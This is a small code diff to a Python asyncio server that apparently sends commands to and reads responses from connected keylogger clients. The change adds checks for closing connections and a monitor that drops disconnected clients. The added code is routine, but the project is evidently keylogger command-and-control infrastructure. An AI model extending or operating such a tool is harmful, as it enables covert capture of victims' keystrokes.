@@ -60,6 +60,10 @@ class Server(metaclass=MetaSingleton):
     async def send_command(self, addr: tuple, command: Command):
         _, writer = self.clients[addr]
         try:
+            if writer.is_closing():
+                logger.info(f'Client {addr} connection is closing, cannot send command')
+                await self.disconnect_client(addr)
+                return
             writer.write(command.COMMAND.encode() + b'\n')
             await writer.drain()
         except (ConnectionResetError, BrokenPipeError) as e:
@@ -74,6 +78,16 @@ class Server(metaclass=MetaSingleton):
             return
         await self.send_command(self.__selected_keylogger, command)
         return await self.read_response(self.__selected_keylogger)
+
+    async def monitor_client(self):
+        clients_delete = []
+        for addr in self.clients:
+            reader, _ = self.clients[addr]
+            if reader.at_eof():
+                logger.info(f'Client {addr} closed connection (detected by monitor)')
+                clients_delete.append(addr)
+        for addr in clients_delete:
+            await self.disconnect_client(addr)
 
     async def handler(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         addr = writer.get_extra_info('peername')
